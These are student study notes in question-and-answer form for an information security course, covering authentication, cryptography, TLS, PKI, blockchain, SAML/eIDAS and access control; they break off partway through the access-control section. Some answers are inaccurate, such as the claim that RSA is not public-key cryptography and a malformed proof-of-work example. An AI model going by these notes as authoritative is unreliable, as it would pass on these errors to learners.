## Domande di I2CNS

#### Introduction

* Define the concept of "CIA Triad"

  >  CIA Stands for:
  >
  >  1. **Confidentiality**: Prevents unauthorized disclosure of information.
  >  2. **Integrity**: The information shouldn't be modified or deleted in an unauthorized manner.
  >  3. **Availability**: Information should be readily available for authorized users and unauthorized withholding of information or resources should be prevented.
  >
  >  It's a vague, platonic and high-level concept in Information Security. There should be some balance between this triad to have a TRULY secure information.

* Define the concept of “Security policy” and give an example

  > Security policies are a mid-level set of rules and requirements established by an organization, regulating the acceptable use of their info and services. They specify through refinement how the CIA triad is implemented to protect confidentiality, integrity and availability of information.
  >
  > Examples: All employees must have a strong password, >16 characters , strictly Alphanumeric + Symbols. All visitors of the server farm should be supervised by a security member.

* Define the concept of “Security mechanism” and give an example

  > Device or function designed to provide one or more security services, a more technology-related level that serves as enforcement of Security Policies. They are usually rated in terms of strength of service and assurance of design
  >
  > Examples: Access Control System. OS Sandbox to isolate applications

#### Authentication I

* Define the concept of "Authentication"; list and explain the three main classes of  authentication factors that can be used in the process and give a concrete example for each of them

  > Authentication is the procedure to verify the identity of an User. It can be useful for access control based on user identity or to log security relevant events in an audit trail.
  >
  > The three main classes of authentications are:
  >
  > * Something you know: Password
  > * Something you have: ID Badge
  > * Something you are: Biometric fingerprint

* What is a password? Characterize what it means for a password to be strong and weak

  > A password is a String/Code/Passphrase that should be secretly shared between the user and the system because it's used to prove that you are who you claim to be.
  >
  > A **strong password**, according to NIST, it's a password **EASY TO REMEMBER, HARD TO GUESS**. Generally speaking, a passphrase of 4 random and uncommon words (sum up to **minimum 8 characters**) is considered strong.
  >
  > Despite what we think, **it's no longer mandatory having special characters.** It's now considered a **BAD** practice having a password with a single word, hard to remember with special characters. 
  >
  > It doesn't require password time expirations, **but it should expire if we think we have a breach.**
  >
  > A **weak password** is easy to guess. Common words, common passphrases, common passwords, single word, combination of numbers only, etc.

* What is a brute force guessing attack? How can it be mitigated?

  > A brute force guessing attack it's an attack on the authentication process. Technically speaking, it's the act of generating all possible combinations of valid symbols in order to guess the password of an user. It can be easily mitigated using **strong passwords** and **limiting login attempts**.

* Define the concept of “Cryptographic hash function” with at least three key properties. Also, give an example of a widely used standard cryptographic hash function currently used.

  > A Cryptographic hash function is an hash function that is suitable for use in cryptography. 
  >
  > Assuming $x$ and $x_1$ and $x_2$ as input, $h(x)$ hash function, $y$ result of the hash function $h(x)=y$
  >
  > * $h$ has to be **deterministic**. $x_1=x_2\implies h(x_1)=h(x_2)$
  > * A small change should change the hash digest extensively (Avalanche Effect)
  > * **Compression**: $h$ maps inputs $x$ of arbitrary bit-length to outputs $h(x)$ of fixed bit-length $n$
  > * **Ease of computation**: given $x$, it's easy to compute $h(x)$
  > * **One-way**: Given a value $y$, it's computationally hard to find an input $x$ such that $h(x)=y$
  > * **Weak collision resistance**: Given $x_1$ and $h(x_1)$, it's computationally hard to find another input $x_2$, $x_1\ne x_2$ with $h(x_1)=h(x_2)$.
  > * **Strong collision resistance**: It's computationally hard to find $x_1$, $x_2$, such that $x_1\ne x_2$ and $h(x_1)=h(x_2)$
  >
  > A widely used example is **SHA-256**.

* Define the concept of "Hash function"

  > A Hash Function is any function $h$ that gets data $x$ in input of arbitrary size and returns a value $h(x)=y$. 
  > $y$ **size is fixed**, it doesn't matter how long it's $x$. $y$ is called **HASH Digest**.

* Describe a brute force guessing attack in the context of password storage. How can it be mitigated?

  > In this context, a brute force guessing attack consist of trying to obtain the password from HASH. This is possible by **generating** random **strings** (or following a pattern) and **hashing each one of this string, checking if it's equal to the hacked HASH Digest.**
  >
  >Formally:
  >
  > $x= generate(); $
  >
  > $h(x)=y_{gen}$
  >
  > is $y_{gen}= y_{hacked}$? if yes, keep $x$ as the original password, Else keep trying.
  >
  > This can be mitigated by doing **Password Salting** *(defined later on)*
  
* Define the concept “Password salting”, its purpose and how it works.

  > Password Salting comes from the **Salting** concept.
  > Salting is the procedure of concatenating a pseudorandom generated string to the $x$ input, before hashing them and saving the **hashed password+salt.**
  >
  > Assuming $x$ as input, $h(x)$ hash function, $y$ result of the hash function $h(x)=y$, $\text{salt}$ as our pseudorandom string:
  >
  > $h(x+\text{salt})=y_{\text{salted}}$
  >
  > As we said before, if we have two input $x_1,x_2$ and $x_1=x_2$, their **hash digest is going to be the same value**.
  >
  > This can lead to **guessing one hash to hack more than one account**. If our database with hashed password gets stolen and more than one user have the same password, **we are going to have the same hash**. 
  >
  > A hacker could try to **compute random strings** $h(\text{random})=y_{rand}$ until $y_{rand} $ is equal to $y_{password}$ or he could use a **Rainbow Table**. Doing so he would **obtain more than one password**. 
  >
  > To mitigate this type of attack, we take advantage of **avalanche effect**, concatenating `salt` to our `password`, **changing our hash digest completely.**

* In the context of password based authentication, describe Multi-factor authentication, what is its purpose, the three available factors, along with an example and the three NIST-defined assurance levels.

  > **MFA** is an advanced authentication method that enhances security beyond traditional password-based systems. It requires users to present multiple proofs of identity, categorized into three types:
  >
  >
  > 1. **Knowledge Factor:** Something the user knows (e.g., password, PIN).
  > 2. **Possession Factor:** Something the user has (e.g., smart card, smartphone).
  > 3. **Inherence Factor:** Something the user is (e.g., biometrics).
  >
  > **Example:** Accessing a bank account online might require a password (knowledge), a code sent to a smartphone (possession), and a fingerprint scan (inherence).
  >
  > **NIST-Defined Assurance Levels**
  > The National Institute of Standards and Technology (NIST) defines three levels of authentication assurance:
  >
  > * **NIST Level 1:** Basic assurance with at least single-factor authentication.
  > * **NIST Level 2:** High confidence with two-factor authentication and cryptographic techniques.
  > * **NIST Level 3:** Very high confidence with cryptographic key proof and hard cryptographic authenticator.

#### Cryptography

* Define the concept of “Cryptosystem” and explain how its encryption and decryption algorithms can be specified mathematically

  > A *cryptosystem*is a *5-tuple*$(E,D,M,K,C)$ where:
  >
  > * $E:$ **E**ncrypt Algorithm;
  > * $D:$ **D**ecrypt Algorithm;
  > * $M: $ set of plaintext **M**essages;
  > * $K: $ set of **K**eys;
  > * $C: $ set of **C**iphertext Messages.
  >
  > We can specify:
  >
  > * **Encryption**: 
  >
  >   ​	$E: M \times K \to C$
  >
  > * **Decryption**: 
  >
  >   ​	$D: C \times K \to M$

* Define the concept of "Key management" and explain why is crucial for cryptography and give some examples

  > Key Management is the process of managing our **keys** during their lifetime: creation, storage, distribution, destruction. Key are the input to a cryptographic algorithm used to obtain **Confidentiality**, **Integrity** and **Authenticity ** over some data.
  >
  > Following the **Kerckhoffs' Principle**, the security of a cryptosystem should depend on the secrecy of the key, not the secrecy of the used algorithm. This means we need to secure our key so nobody can use them if not authorized.
  >
  > For example, keys should be securely stored: we can rely on access control mechanism to protect them or dedicated hardware components
  >
  > For example, keys should be shared through a secure channel to avoid malicious interception. This problem is solved using asymmetric encryption techniques

* What are substitution and transposition ciphers? Give also examples 

  >  **Substitution and transposition cipher** are two main techniques to obtain a ciphertext from a plaintext (and viceversa) having a Key in a cryptosystem.
  >
  > **Substitution Cipher**: Every unit of our ciphertext is obtained from plaintext by replacing with another unit.
  >
  > An example: **Caesar Cipher**, called $ROT_k$, shift to right of $k$ positions all the alphabet, leading to another new alphabet.
  >
  > **Transposition Cipher:** Ciphertext is obtained from plaintext by making permutation of every unit.
  >
  > An example: **Columnar Cipher** arranges letters writing them in a column of fixed length and swapping them using a keyphrase.

* What does it mean for a cryptographic technique to be computationally secure? 

  > A cryptographic technique is **computationally secure** if and only if:
  >
  > * The **time** of breaking it **exceeds** the **useful lifetime** of the information;
  > * The **cost** of breaking it **exceeds** the **value** of the information.

* Define the concept of “Symmetric key cryptography”

  > Symmetric Key Cryptography is a cryptosystem where:
  >
  > * The **key** is distributed to all whom it may concern;
  > * We have only a **single key** to Encrypt and Decrypt.
  > * **Key** management determines who can access the data.
  >
  > Encryption:
  >
  > ​	$E(K,M) = C$
  >
  > Decryption:
  >
  > ​	$D(K,C)=M$

* Why is DES deprecated? Why is AES still used?

  > **DES** is deprecated because it uses **Feistel Algorithm** with $56$ bit key. This leads to **low entropy**, so it's easier to compute the key using brute force. 
  >
  > **AES** is still used because it uses a stronger crypto scheme called Rijndael, with $\ge 128$ bit key size. (Generally speaking $128,192,256$ bits). 
  >
  > This leads to **higher entropy** of the **keyspace**, providing (using the weakest $128$ bit AES key) $10^{21}$ times more keys than DES $56$ bit key.

* Define the concept of “Asymmetric (public) key cryptography”

  > Asymmetric Public Key Cryptography (**PKC**) is a cryptosystem where:
  >
  > * Each user have $2$ keys, a **private key** and a **public key**.
  >
  > * It's based on **One Way Functions**:
  >
  >   * Multiplication is **easy to compute**, Factorization is **hard to compute**:
  >
  >     Multiplication: $13\cdot 17 = 221$
  >
  >     Factorization: $221 = ? \cdot ?$
  >
  >   * Exponentiation is **easy to compute**, Finding $\log$ is **hard to compute**:
  >
  >     Exponentiation: $x^y=5^3=125$
  >
  >     Log: $\log_x125=y$ it's harder.
  >
  > * Encryption:
  >   * **Public Key** encrypt
  >   * **Private Key** decrypt
  >   * This leads to **Confidentiality **and **Integrity** 
  > * Signature and Validation:
  >   * **Public Key** decrypt
  >   * **Private Key** encrypt
  >   * This leads to **Integrity**, **Authenticity **(if using certificate) and **Non repudiation** *(you can't say "i didn't send that").*

* Explain the RSA technique and describe its flow

  > The RSA (Rivest, Shamir, Adleman) is a technique that:
  >
  > * Factorization to **decrypt**, Multiplication to **encrypt**
  > * is widely used in our modern days to mainta/in the **CIA** triad;
  > * uses **prime numbers**;
  > * uses **private key** and **public key**;
  > * uses **factorizations**, uses **One Way Function**;
  > * it's not PKC even if it uses Private Key and Public Key.
  >
  > Generate Public and Private Key:
  >
  > 1. Find two primes big enough $p,q | p\ne q$
  > 2. Define **modulus** $N= p\cdot q$
  > 3. Find $e$ such that $GCD(e, (p-1)(q-1)) = 1$
  > 4. Find $d$ such that $e\cdot d=1\mod((p-1)(q-1))$
  > 5. **Public key:** $(N,e)$
  > 6. **Private key:** $(d)$
  >
  > It's flow is:
  >
  > * **A** wants to send a message to **B**
  > * **B** sends his/her **public key** to **A**
  > * **A** write a message and encrypt the message with **B** **public key.**
  > * **A** sends the encrypted message to **B**.
  > * **B** decrypt the message with his/her **private key.**
  >
  > *If B wants to respond, repeat all this but switch A with B.*

* Explain the Diffie-Hellman technique, describe its flow and a possible attack

  > The DH is a Technique that:
  >
  > * is mainly used as a **key agreement protocol**;
  > * it uses the **Discrete Logarithm Problem**, with **One Way Function**;
  > * Exponentiation to encrypt, log to decrypt.
  >
  > Key Generation:
  >
  > * It uses **Exponentiation** as a one way function;
  > * **Discrete Logarithm Problem** uses:
  >   * $p$ prime number, higher is better;
  >   * $g$ generator;
  >   * $x$ secret number;
  >   * $X=g^x\mod p$ such that ($0<X<p$)
  >
  > Flow:
  >
  > * Client sends to Server $p,g, A= g^a\mod p$ , where $a$ is a secret number known only to client.
  > * Server sent back $B=g^b\mod p$, where $b$ is a secret number known only to server.
  > * Client compute $\text{Shared}=B^a\mod p$
  > * Server compute $\text{Shared}=A^b\mod p$
  > * **Shared** is the same if all went good.
  > * Now $\text{Shared}$ is known to both, but it was never sent, so it's private.
  >
  > This is generally used on another bulk algorithm.
  >
  >
  > DH weakness is **MITM** (Man In The Middle), acting as a Server for the True Client and as a Client for the True Server, simultaneously.

* Explain advantages and disadvantages of symmetric and asymmetric cryptography

  > **Symmetric cryptography**
  >
  > Pros
  >
  > * It's faster.
  >
  > Cons
  > * If someone intercept the key, it's all useless, so you can't use untrusted communication channel.
  > * You can't verify who sent you the information.
  >
  > **Asymmetric Cryptography**
  >
  > Pros
  > * Can be used on untrusted channel.
  > * You can verify the integrity of the message with a signature.
  >
  > Cons
  > * You still can't associate real identities with public keys, you have to use certificates.
  > * It's slower.
  > * Diffie Hellman is MITMable.

* Explain the concept of "One-way function" and how it's used in RSA and Diffie-Hellman

  > **One Way Functions**:
  >
  > - Moltiplication is **easy to compute**, Factorization is **hard to compute**:
  >
  >   Moltiplication: $13\cdot 17 = 221$
  >
  >   Factorization: $221 = ? \cdot ?$
  >
  > - Exponentiation is **easy to compute**, Finding $\log$ is **hard to compute**:
  >
  >   Exponentiation: $x^y=5^3=125$
  >
  >   Log: $\log_x125=y$ it's harder.
  >
  > In RSA is used **Factorization**, in **DH** is used **Discrete Logarithm Problem**. *(Check explanation above for each one)*

#### Cryptography at work

* How can PKC be used for identification (sign messages)?

  > **PKC** could be used to identification (sign messages) by:
  >
  > - **Public Key** decrypt
  > - **Private Key** encrypt
  > - This leads to **Integrity**, **Authenticity **(If using certificate) and **Non repudiation** *(you can't say "i didn't send that").*

* Explain the notion of “Integrity” and how a cryptographic hash function can be used to guarantee the integrity of messages

  > Integrity is preserved when the data are intact, not modified from sender to receiver.
  >
  > To guarantee integrity with hash function:
  >
  > 1. Sender Side
  >    1. **A** create **HASH Digest** of the message. 
  >    2. **A** uses his/her **Private Key to Sign** the Digest.
  >    3. **A** uses B **Public Key to encrypt** the message.
  >    4. **A** send the message to B.
  > 2. Receiver Side
  >    1. **B** receive the message
  >    2. **B** **decrypt** the message with his/her **Private Key**.
  >    3. **B** **check the signature** of the hash with **A Public Key**.
  >    4. **B** uses the **same hash function** used by **A** to **compute the HASH Digest** of the message.
  >    5. **B** **checks** if the **computed HASH Digest is equal to the received one.**
  >    6. if True, i have achieved integrity.

* Explain how a man-in-the-middle attack on a network can be countered

  > **MITM** attack can be countered by using **TLS/SSL** security. Using this protocol will let the Middleman see all the packets, but they are encrypted by the TLS/SSL Master key(decided with Diffie Hellman). (**Confidentiality**)
  >
  > MITM can still attack **DH Key Exchange**, but he will get busted if **Server is using a strong Cipher** and a **Certificate** X.509. (**Authenticity**)
  >
  > **Integrity** is obtained by **cipherspec's Hash Algorithm**, which needs to be **strong** and safe.

* What is a digital certificate and what are its main components? (X.509 standard)

  > A digital certificate is a **binding of a Public Key and a subject** (supposedly it's owner). 
  >
  > Main components of a Digital Certificate are:
  >
  > 1. Certification Authority Data (**ISSUER**)
  > 2. Subject Data (**SUBJECT**)
  > 3. **Expiration Date**
  >
  > Each **Data** is composed of:
  >
  > * **Unique ID**
  > * **Name**
  > * **Signature** (Only CA)
  > * **Public Key** (Only Subject)
  > * **Algorithm used to compute Signature/Public Key.**
  >
  > Extension of data, Serial Number are also there.

* Describe the Public Key Infrastructure and its main entities (CA, RA, VA)

  > The PKI is a system that provides for a **TTP (Trusted Third Party)** to vouch for **user identities** with the binding of public keys to subjects, through the generation of a **Trusted Digital Certificate**.
  >
  > PKI is composed of:
  >
  > * **CA: Certification Authority**, third party that associates an identity with its public key and generates the certificate, signing it
  > * **RA: Registration Authority**, responsible for accepting requests for digital certificates and authenticating the entity, assuring valid and correct registration
  > * **VA: Validation Authority**, provide entity information on behalf of the CA. Interrogates the CRL, checks signatures, validity and distribution of certificates. Usually it's the browser role
  > * **CPS: Cryptographic Practices Statement**, telling everyone which security is implementing for issuing certificates;
  > * **Certification Repository**: Where the certificates are stored;
  > * **Certificate Revocation List (CRL)**: where are stored all the revoked/not valid certificates.

* Explain TLS by defining its main goal, in which context is routinely used, its relationships with SSL. Then briefly describe the purposes of its two main sub-protocols.

  > The main goal of TLS protocol is to **provide privacy and data integrity** between two communicating applications.
  >
  > It's routinely used between **Browsers and Web Servers**.
  >
  > **TLS** was born to **standardize SSL**. TLS 1.0 starts from **SSLv3 + Tweaks.** TLS has the same **SSL protocol design** but uses **different algorithms**.
  >
  > The two main sub-protocols are:
  >
  > 1. **Handshake Protocol**: It negotiate ciphers ,protocols and connect Client and Server providing Privacy (confidentiality), Integrity and (optional) Authentication of Server and (optional) Client. The handshake protocol uses **Diffie-Hellman** to exchange the **Master Key** that will be used in TLS Record Protocol, **switching from Asymmetric Encryption(Diffie-Hellman) to Symmetric Encryption** (RC4, IDEA, DES, 3DES, AES, ...).
  > 2. **Record Protocol**: Use the shared key established in the handshake protocol to protect the communication between client and server

* Describe the SSL/TLS handshake protocol with the help of the Message Sequence Chart

  > * **ClientHello**: Start by proposing 
  >   * 1st cipher available;

  >   * Requested cipher (if available or permitted);
  >   * Requested protocol (if available or permitted);
  >   * **Session ID**
  > * **Certificate**: If asked.

  > * **CertificateVerify**: If asked, this will provide a mean for the server to validate the client certificate.
  > * **ChangeCipherSpec:** 1 bit, the participant transitions to the agreed cipher suite
  > * **Finished**: The entire handshake is hashed and encrypted with the symmetric master key
  >
  > Then they'll both use the Diffie-Hellman Generated **Master Key** to swap to Symmetric Encryption with the **previously chosen cipher** (and protocol version).

* What are the potential security problems of TLS?
  > TLS suffers from some security issues for a few reasons:
  >
  > * **Backward compatibility** with weak ciphers and broken hash function
  > * **Logical flaws** in the protocol that can be used to trick both client and server
  >
  > In the initial exchange of Hello Messages, client and server negotiates the protocol version and the cipher suite: for this reason an attacker can force the use of an exploitable cipher suite or version.
  >
  > Some examples of attacks are: sweet32, 3shake, crime

* Why are digital signature important? What kind of problem they solve?

  > Digital Signature are important because they solve the **Integrity** problem, by **signing** an hash/file we are sure nothing has been modified in the communication. 
  >
  > Digital Signature also offer **Non Repudiation**. If i sign a message, i can't later say that i didn't send that message.
  >
  > They are strictly interconnected with Certificates, which certifies a signature, creating a bond between **Subject** and **Public Key**, leading to **Authentication**.

#### Blockchain

* Describe the structure of the blockchain data-structure

  > The Blockchain data Structure is composed of:
  >
  > * Index $i$
  > * Timestamp $t$
  > * Data $d$
  > * Hash of the previous Block $Hp$
  > * Hash of these information $h(i,t,d,Hp)$

* In the context of blockchain, what is the difference between _private_ and _permissioned_? Define the notion of _immutability_. Define the notions of _height_ and _depth_ of a block.

  > A blockchain is **private** if it's access it's restricted by some procedure, only some can **read** the blockchain. A blockchain is permissioned when everybody can't write on it, only some privileged ones are permitted to **write** the blockchain.
  >
  > A **private** blockchain can be permissionless or permissioned.
  >
  > A **permissioned** blockchain can be public or private.
  >
  > A block is **immutable** when each change to old transactions can't be modified without resulting in an **inconsistency state**, leading to the removal of the upcoming transaction(edit) and restoring it to a consistency state.
  >
  > **Height**: Number of blocks from the first (genesis)
  >
  > **Depth**: Number of blocks from the end
  >
  >*Other useful informations:*
  >
  > **Stability(k):** After $k$ blocks, the transition is called 'stable'.
  >
  > **Persistence:** If someone honest calls a transition stable, all the honest distributed ledger have the same stable position $k$.
  >
  > **Liveness:** After $u$ rounds of an authentic transaction, it becames stable for all honest ledger.
  
* What is the double spending problem? How can it be solved?

  > The double spending problem is the issue where an user can spend the same amount of money from the same wallet at the same time. This leads to two unconfirmed transaction using the same amount of money.  
  >
  > This is mitigated by the consensus BFT algorithm called **proof-of-work**, consist of solving a mathematical puzzle to check which one will put the block next in the blockchain. When the hash is solved, using distributed ledger, the owner of the block let everyone knows that the **block is added** because he won the race, **solving the hash before others**. When this is added, the other nodes **will check and confirm(validate)** that the solution given matches.  
  >
  > One of the two transaction is added to a block before putting it in the blockchain and this block is connected to the blockchain **if the owner of the block solves a mathematical puzzle** (hashing) before someone else.
  >
  > If the second transaction is checked, it will be rejected because of the first one already in the blockchain.
  >
  > If both are added at the same time in different blocks, a race will start. 
  >
  > After 6 blocks, one of the two should be rejected ($\simeq 0.1\%$ that both still lives).

* What is the Byzantine General Problem and why is it relevant for blockchain?

  > The Byzantine General Problem is an issue that appears when more than one general have to attack a single point.
  >
  > To win, they must attack all together. They can retreat, but all together. All generals have to agree to the same positions (**consensus**).
  >
  > The problems that might appears are:
  >
  > * What if at least one of the general is a traitor?
  > * What if at least one of the general won't listen the other?
  > * What if the communications between generals get lost or damaged? or even changed?
  > * How can i check that the others general have got my message? how can they check if their ACK came to me?
  >
  > To solve this problem, we have a **Byzantine Fault Tolerance**.
  >
  > This is correlated to blockchain because each general is a **node in the blockchain**, trying to obtain a **consensus**. All the participants of the network have to agree to the same action on the Distributed Ledger.

* What is the Proof-Of-Work approach to solving the consensus problem?

  > Byzantine Fault Tolerance algorithm called **proof-of-work**, consist of solving a mathematical puzzle to extract the node that will add the next block in the blockchain. The nodes have to compete against each other to be the first to guess the solution. When the problem is solved, the winner updates its distributed ledger and broadcasts the solution: the owner of the block let everyone knows that the **block is added** because he won the race, **solving the problem before others**. When this is added, the other nodes **will check and confirm (validate)** that the solution is correct.  
  >
  > When the block is added, the owner **gets rewarded with ownership** of the block and a reward.
  >
  > The mathematical puzzle should be hard to compute but easy to verify, for example find a value $x$ such that $h(x+1234) > 12$ using an hash function $h$

* Explain the difference between a blockchain and a distributed ledger

  > A blockchain is a distributed ledger, but not every distributed ledger is a blockchain.
  >
  > They have in common:
  >
  > * A distributed ledger copies are distributed among the nodes
  > * Every time there's an update, every ledger gets updated.
  >
  > A blockchain is also a chain of blocks, while **Distributed Ledger isn't necessarily a blockchain.**

* Define the terms "public", "private", "permission-less" and "permissioned"

  >A blockchain can be Public or Private:
  >
  >* **Public:** Everyone can **read** the entire blockchain.
  >* **Private:** Not everyone can **read** the blockchain, a restricted group of users can.
  >
  >A blockchain can be permission-less or permissioned:
  >
  >* **Permissionless:** Everyone can **write** on the blockchain.
  >* **Permissioned**: Not everyone can **write** the blockchain, a restricted group of users can.

#### Authentication II

* What is SAML?

  > **SAML** stands for Security Assertion Markup Language, it's a definition of **mechanisms and formats for the communication of identity information** between Identity Provider and Service Provider.

* What are the goals of SAML?

  > The goals of SAML are:
  >
  > * **Creation** of a trusted security statement;
  > * **Exchange** of security statements.
  >
  > SAML does **not** provide:
  >
  > * Performing authentication;
  > * Granting access.
  >
  > SAML is an XML framework to Create and Exchange Statements, then Service Providers will decide what to do.

* What is the structure of a SAML assertion?

  > A **SAML Assertion** is a bunch of **statements** made by a SAML Authority.
  >
  > SAML has :
  >
  > * **Issuer**
  > * **Signature**
  > * **Subject**
  > * **Condition**
  > * **AuthNStatement**
  >
  > It can represent 3 types of **assertion**:
  >
  > - **Authentication**: Subject is authenticated using X modality at Y time
  > - **Attribute**: Attributes associated to the subject
  > - **Authorization Decision**: The authorization is *Accepted* or *Denied*

* What is a SAML profile? Give also an example

  > A **SAML Profile** is a combination of Assertion, Protocols and Bindings to support a defined use case. This leads to **extension** and **constraints** depending from use case.
  >
  > An example is the (most used one) **WEB SSO**.

* Give a definition of Single Sign On (SSO), describe its purpose, explain one of its strengths and one of weaknesses. Draw also an high-level diagram with the involved entities.

  > A **SSO** is a technique used to **access multiple apps with a single authentication act.**
  >
  > **SSO reduces password fatigue**, we just need to remember one password for multiple services, but if it's **compromised** we are letting someone else **enter on multiple services with a single password.**
  >
  > ```mermaid
  > graph LR;
  >     User--strong trust-->I(Identity Provider);
  >     User--loose trust-->S(Service Provider);
  >     I-.trust.-S
  >     
  > ```
  >
  >

* What is the difference between IdP-Initiated and SP-Initiated SSO? Describe their flows providing a Message Sequence Chart

  > **IdP-Initiated SSO:**
  >
  > 1. The client logs in to the IdP;
  > 2. The client select a Source using IdP;
  > 3. The IdP Redirects the Client to the SP requested, with a signed SSO auth response attached;
  > 4. The SP supply the resource after validating the SSO Response.
  >
  > ```mermaid
  > sequenceDiagram
  > 	IdP ->>+User: Login Page
  > 	User-->>-IdP: Login Information
  > 	User->>+IdP: Select Source
  > 	IdP-->>-User: Signed SSO Response
  >     User->>+SP: Signed SSO Post Response
  >     SP-->>-User: Resource
  > ```
  >
  > **SP-Initiated SSO:**
  >
  > 1. The client ask for a SP resource. 
  >    If the resource is free, SP give to client, if it's protected then check for permission.
  >
  > 2. The SP redirect the client to IdP with AuthRequest.
  > 3. The Client Authenticate itself to the IdP.
  > 4. The IdP redirect the client to SP with a Signed AuthResponse.
  > 5. The SP gives the resource, if permitted.
  >
  > ```mermaid
  > sequenceDiagram
  >  	participant SP as SP
  >     participant User as User
  >     participant IdP as IdP
  > 	User->>+SP: Request Resource
  > 	SP-->>User: AuthRequest
  > 	User->>+IdP: AuthRequest
  > 	IdP -->>User: Login Page
  > 	User-->>IdP: Login Information
  > 	IdP-->>-User: Signed AuthResponse
  > 	User ->>SP: AuthResponse
  > 	SP -->>-User: Resource
  > ```

* What are the main security concerns underlying the deployment of SAML? What are the main mitigation measures?

  > SAML doesn't provide **Confidentiality** and **Integrity**, neither **Authentication** of IdP or SP. 
  >
  > This means someone could **MITM.**
  >
  > To mitigate this issue, we should use **SSL/TLS** to gain **Confidentiality** and **Integrity**, then request a **Bilateral authentication** to obtain **Authentication**, using SSL/TLS **Certificates**.
  >
  > Every message which pass from an user should be **signed** to provide **Integrity**.

* What are the main privacy concerns underlying the deployment of SAML? What are the main mitigation measures?

  > SAML should let the user control how it's identity is **shared and used**. 
  >
  > SAML should **inhibit correlations between Service Providers**.
  >
  > To mitigate this, IdP set **pseudonyms** and uses **one time identifiers** so the response won't have the same global identifier.

* What is SPID? What is eIDAS? Is there a relationship between the two?

  > **SPID** is Sistema Pubblico Identità Digitale, the italian adaptation of SAML 2.0, 
  >
  > it adds one entity: the **Attribute Provider** which gives the Service Provider a **Qualified Attribute** if asked.
  >
  > **eIDAS** is Electronic Identification Authentication and trust Services, an european regolation that let users authenticate in all Europe.
  >
  > **eIDAS IdP** can connect with **SPID IdP** using an **eIDAS Connector**(Node) and an **eIDAS Service (Node)**.

* Give an example of scenario in which eIDAS is useful

  > If i want to open a bank account, i need my identity verified. If i'm italian and i'm trying to open a bank account in france, i need my SPID. Logging with eID National Verification System lets servers get my identity, asking the italian IdP SPID if my Identity is OK. This works by eIDAS-Connector France, which ask to eIDAS-Service in italy to give my information to the bank.

#### Access control I

* Define the concept of “Access Control”, draw the architecture for its enforcement, explain the role of each component in the architecture and how an access control request is handled

  > Access Control is the act to **mediate requests** from subject to resources and check if the access is **Granted or Denied**.
  >
  > His architecture is composed of:
  >
  > * **Subject**(Actor): The one who performs a request
  >
  > * **Request**: Access Request
  >
  > * **ACM**: Access Control Module, which is composed of:
  >
  >   * **Guard**: It receives an Access Request, then it checks with **Policies** if it's granted or denied (Policy Decision Point), then it write the output to the **Audit Log** and send the response(and grant access if granted) to the  subject.
  >
  >   * **Policy:** all the policies, set of rules which are used to determine the access to a resource.
  >
  >   * **Audit Log**: Logs of all the requests and their status.
  >
  > It's important to say we have **two isolation boundaries:**
  > 
  > * One outside **ACM**, that doesn't permit the user to get inside, he can only talk with the Guard.
  >* One inside **Audit Log**, because logs shouldn't be edited by no one, only added by the guard.
  > 
  >The guard **authenticate the client** and **authorize him/her** with **policies**, giving the **resource if accepted**. For every request, guard will **keep an Audit Log**, to post analysis if necessary.
  > 
  >*Draw this ^* 
  > 
  >![img](https://imbt.ga/qGe7r6CbUs)
  > 
  > Access control can be seen as a **structured approach**:
  >
  > * **Policy**: Set of rules
  >* **Model**: Mathematic representation of the policy (how it works)
  > * **Enforcement**: Implementation of the Model (a logically correct model could lead to a vulnerable implementation, for example leading to a SMASH THE STACK issue)
  >
  > this helps to understand a policy and to find bugs easier.

* What is an Access Control Matrix? How can ACLs and Capabilities represent it? Describe the environments where they are typically used, their advantages and disadvantages with the consequences

  > An Access Control Matrix is a **basic model** to implement Access Control.
  >
  > It's a matrix with **subject as rows and resource as columns**. The combination cell is the permission of the subject for the requested resource.
  >
  > The permission can be:
  >
  > * **O**: Own
  > * **R:** Read
  > * **W:** Write
  > * **X:** Execute
  >
  >
  >
  > **ACL**(Access Control List) is an **enforcement** of the ACMatrix. It represent the matrix with a List uses the **resource as a pointer**, and each pointer leads to all the subject with their **relative permissions for that resource.**
  >
  > ACL is tipically used integrated in the **file system**. It's easier to represent them with groups when we have a bigger user base, it's easier for the guard to obtain the policies (guard can check the file and check the subject permissions). ACL can lead to a bigger file if there's a lot of users that have permissions on it.
  >
  >  ACLs are widely used in environments where the users manage the security of their own files such as Unix systems. Their advantages are the following:
  >
  > * they are easy to understand, 
  > * it is easy to answer questions as “who has access to a resource and what is the type of access?”, 
  > * they work well in distributed systems. 
  >
  > The main **disadvantage** is their inefficiency when determining rights if the list is long. 
  >
  >**Capabilities** is an **enforcement** of the ACMatrix. It represent the matrix with a List uses the **subject as a pointer**, and each pointer leads to all the resources with their **relative permissions** **for that subject**.
  >
  > The main problem with capability lists is that **changing the status of a resource can be difficult because it can be hard to find out which users have permission to access the resource**. 
  >
  > For example, changing a program’s status so that no user may execute it can be difficult because it can be hard to find out which users have permission to execute the program.
  
* Define the notions of DAC and MAC models; explain differences, advantages and disadvantages of each one. Give at least one example of the scenarios in which each one is typically used

  > **DAC**: Discretionary Access Control 
  >
  > The permission of the resource is set by the owner of the resource. He decides what to do, how to set (Read,Write,Execute).
  >
  > If we have lots of users, we can use **groups and ACL**.
  >
  > **Typically used in OS.**
  >
  > * Advantages: 
  >   * **Flexible**: Easy to understand and edit permissions. 
  >   * **Intuitive**
  > * Disadvantages:
  >   * **Subjective**: The owner decides who can **RWX**.
  >   * The security is related to the **owner's skills.**
  >   * **Vulnerable to Trojans**: A can send a Trojan to B and make B changes the permissions.
  >
  > **MAC**: Mandatory Access Control
  >
  > **Used in the military,** it has **Multi Level Security** and it uses **Clearances**(If referred to a subject) and **Security Label** (if referred to a resource).
  >
  > Generally speaking we have Security Levels:
  >
  > * Top Secret
  > * Secret
  > * Confidential
  > * Unclassified
  >
  > Each level represents a **Trustworthiness Level(Clearances)** or the **Sensitivity Level (Security Label)** of the information. 
  >
  > They are set in an ordinate Hierarchical set of trust:
  >
  > Top Secret $>=$ Secret $>=$ Confidential $>=$ Unclassified
  >
  > The Clearances uses C=(**Security Level**, {**Security Labels (Need to Know)**})
  >
  > **Need to Know principle**: Principle of the Least Privilege.
  >
  > If it uses **Bell-La Padula Model**, it follows three policies:
  >
  > * **No Read Up**: Subject can read a resource if his clearance level dominates it. (His **clearance level is 'stronger' (or equal) than the Security level** and the **Resource Need to Know is a subset of the Subject Need to Know**)
  >
  >   $(SClearance,SNeedToKnow)>=(RSecurityLevel,RNeedToKnow)\\SNeedToKnow\supseteq RNeedToKnow$
  >
  >   *This is needed because someone could read confidential information(on a stronger security level), using the Need To Know Principle.*
  >
